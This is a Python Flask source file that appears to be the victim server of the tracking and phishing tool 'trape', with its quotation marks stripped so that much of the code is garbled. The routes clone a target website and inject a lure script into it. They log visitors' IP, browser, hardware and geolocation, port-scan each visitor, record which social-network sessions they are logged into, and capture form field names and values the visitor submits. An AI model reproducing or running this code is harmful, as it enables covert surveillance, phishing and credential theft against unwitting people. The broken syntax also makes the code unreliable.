












from flask import Flask, render_template, session, request, json
from core.victim_objects import *
from core.utils import utils
from core.db import Database



trape = core.stats.trape
app = core.stats.app


db = Database()

class victim_server(object):
    @app.route(/ + trape.victim_path)
    def homeVictim():
        opener = urllib2.build_opener()
        headers = victim_headers()
        opener.addheaders = headers
        html = victim_inject_code(opener.open(trape.url_to_clone).read(), lure)
        return html

    @app.route(/register, methods=['POST'])
    def register():
        vId = flask.request.form[vId]
        if vId == :
          vId = core.utils.utils.generateToken5

        victimConnect = victim(vId, flask.request.environ[REMOTE_ADDR], flask.request.user_agent.platform, flask.request.user_agent.browser, flask.request.user_agent.version,  core.utils.utils.portScanner(flask.request.environ[REMOTE_ADDR]), flask.request.form[cpu], time.strftime%Y-%m-%d - %H:%M:%S)
        victimGeo = victim_geo(vId, city, flask.request.form[countryCode], flask.request.form[country], flask.request.form[query], flask.request.form[lat], flask.request.form[lon], flask.request.form[org], flask.request.form[region], flask.request.form[regionName], flask.request.form[timezone], flask.request.form[zip], flask.request.form[isp], str(flask.request.user_agent))

        core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[blueBold] + * + core.utils.utils.Color[white] + ] +  A victim has been connected from  + core.utils.utils.Color[blue] + victimGeo.ip + core.utils.utils.Color[white] +  with the following identifier:  + core.utils.utils.Color[green] + vId + core.utils.utils.Color[white])
        cant = int(db.sentences_victim(count_times, vId, 3, 0))

        db.sentences_victim(insert_click, [vId, trape.url_to_clone, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        db.sentences_victim(delete_networks, [vId], 2)

        if cant > 0:
            core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[blueBold] + * + core.utils.utils.Color[white] + ] +   + It's his  + str(cant + 1) +  time)
            db.sentences_victim(update_victim, [victimConnect, vId, time.time()], 2)
            db.sentences_victim(update_victim_geo, [victimGeo, vId], 2)
        else:
            core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[blueBold] + * + core.utils.utils.Color[white] + ] +   + It's his first time)
            db.sentences_victim(insert_victim, [victimConnect, vId, time.time()], 2)
            db.sentences_victim(insert_victim_geo, [victimGeo, vId], 2)
        return flask.json.dumps({status : OK, vId : vId});

    @app.route(/nr, methods=['POST'])
    def networkRegister():
        vId = flask.request.form[vId]
        vIp = flask.request.form[ip]
        vnetwork = flask.request.form[red]
        if vId == :
          vId = core.utils.utils.generateToken5
        core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[greenBold] + + + core.utils.utils.Color[white] + ] + core.utils.utils.Color[whiteBold] +   + vnetwork + core.utils.utils.Color[white] +  session detected from  + core.utils.utils.Color[blue] + vIp + core.utils.utils.Color[white] +   + with ID:  + core.utils.utils.Color[green] + vId + core.utils.utils.Color[white])

        cant = int(db.sentences_victim(count_victim_network, [vId, vnetwork], 3, 0))

        if cant > 0:
            db.sentences_victim(update_network, [vId, vnetwork, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        else:
            db.sentences_victim(insert_networks, [vId, vIp, flask.request.environ[REMOTE_ADDR], vnetwork, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        return flask.json.dumps({status : OK, vId : vId});

    @app.route/redv
    def redirectVictim():
        url = flask.request.args.geturl
        opener = urllib2.build_opener()
        headers = victim_headers()
        opener.addheaders = headers
        html = victim_inject_code(opener.open(url).read(), vscript)
        return html

    @app.route(/regv, methods=['POST'])
    def registerRequest():
        vrequest = victim_request(flask.request.form[vId], flask.request.form[site], flask.request.form[fid], flask.request.form[name], flask.request.form[value], flask.request.form[sId])
        db.sentences_victim(insert_requests, [vrequest, time.strftime%Y-%m-%d - %H:%M:%S], 2)
        core.utils.utils.Go(core.utils.utils.Color[white] + [ + core.utils.utils.Color[greenBold] + = + core.utils.utils.Color[white] + ] +   + Receiving data from:  + core.utils.utils.Color[green] + vflask.request.id + core.utils.utils.Color[white]  +   + on +   + core.utils.utils.Color[blue] + vflask.request.site + core.utils.utils.Color[white] + 	
 + vflask.request.fid + 	 + vflask.request.name + :	 + vflask.request.value)
        return flask.json.dumps({status : OK, vId : vflask.request.id});

    @app.route(/tping, methods=['POST'])
    def receivePing():
        vrequest = flask.request.form[id]
        db.sentences_victim(report_online, [vrequest])
        return flask.json.dumps({status : OK, vId : vrequest});
